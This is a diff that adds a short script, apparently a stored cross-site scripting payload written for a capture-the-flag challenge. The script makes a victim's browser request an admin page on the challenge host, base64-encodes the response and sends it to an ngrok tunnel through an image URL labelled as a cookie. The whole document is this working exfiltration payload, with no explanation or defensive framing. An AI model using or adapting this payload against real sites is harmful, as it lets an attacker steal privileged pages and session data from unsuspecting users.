@@ -1,0 +1,10 @@
+<script>
+    var req = new XMLHttpRequest();
+    req.open('GET', 'http://pwn.osucyber.club:13378/admin', false);
+    req.send(null);
+    console.log("HERE!");
+    url = "http://8e6c293f1b3b.ngrok.io/idiot.png?cookie=";
+    result = req.responseText;
+    url = url.concat(window.btoa(result));
+    document.write("<img src='" + url + "'></img>");
+</script>
